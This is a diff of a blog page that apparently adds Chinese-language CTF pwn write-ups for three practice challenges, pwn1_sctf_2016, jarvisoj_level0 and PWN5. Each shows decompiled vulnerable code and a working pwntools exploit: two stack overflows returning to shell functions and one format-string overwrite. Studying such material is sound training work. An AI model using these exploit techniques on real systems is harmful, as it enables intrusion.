@@ -253,6 +253,17 @@
           
           
           <li>
+            <a href="/archive/">
+              
+              归档
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
             <a href="/tags/">
               
               标签
@@ -267,17 +278,6 @@
             <a href="/about/">
               
               关于
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/archive/">
-              
-              归档
               
               
             </a>
@@ -397,11 +397,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">1</span> Minutes
+              Estimated Reading Time <span class="post-count">4</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">255</span> In Total
+              Words <span class="post-count">851</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -518,7 +518,46 @@
 <blockquote>
 <p>flag{7282e0c5-08b5-442c-a3da-6dd8a74f15ac}</p>
 </blockquote>
-
+<h3 id="pwn1-sctf-2016">pwn1_sctf_2016</h3>
+<ol>
+<li>查看主函数</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, edata);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v4);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v5);</span><br><span class="line">  v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>限制了输入的字符长度为 32 位，s 空间为 60，似乎没有栈溢出，但后续存在字符替换，将 I　替换为 you，导致栈溢出</li>
+<li>payload</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;I&#x27;</span> * <span class="number">20</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">4</span> + p32(get_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为 32 位程序，所以为 &#x27;a&#x27; * 4</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>exp</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = e.symbols[<span class="string">&#x27;get_flag&#x27;</span>]  <span class="comment"># 0x8048f0d</span></span><br><span class="line"><span class="built_in">print</span> system, <span class="built_in">type</span>(system), <span class="built_in">hex</span>(system)</span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span> * <span class="number">20</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">4</span> + p32(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="jarvisoj-level0">jarvisoj_level0</h3>
+<ol>
+<li>checksec</li>
+</ol>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>主函数</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>常规栈溢出，注意栈对齐</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, &#x27;26729&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = e.symbols[<span class="string">&#x27;callsystem&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> system, <span class="built_in">type</span>(system), <span class="built_in">hex</span>(system)</span><br><span class="line">payload = <span class="string">&#x27;*&#x27;</span> * <span class="number">0x88</span> + p64(system + <span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="第五空间2019-决赛-PWN5">[第五空间2019 决赛]PWN5</h3>
+<ol>
+<li>checksec</li>
+</ol>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>主函数</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>判断输入的密码与随机数是否相等，</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(ip, port)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">addr = p32(<span class="number">0x804C044</span>)</span><br><span class="line">payload = addr + <span class="string">&#x27;%10$n&#x27;</span>  <span class="comment"># 覆盖</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)  <span class="comment"># p32 指针为 4字节</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
         <hr>
         <!-- Pager -->
@@ -617,7 +656,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#rip"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">rip</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#warmup-csaw-2016"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">warmup_csaw_2016</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ciscn-2019-n-1"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">ciscn_2019_n_1</span></a></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#rip"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">rip</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#warmup-csaw-2016"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">warmup_csaw_2016</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ciscn-2019-n-1"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">ciscn_2019_n_1</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#pwn1-sctf-2016"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">pwn1_sctf_2016</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#jarvisoj-level0"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">jarvisoj_level0</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">[第五空间2019 决赛]PWN5</span></a></li></ol>
         
         </div>
       </aside>
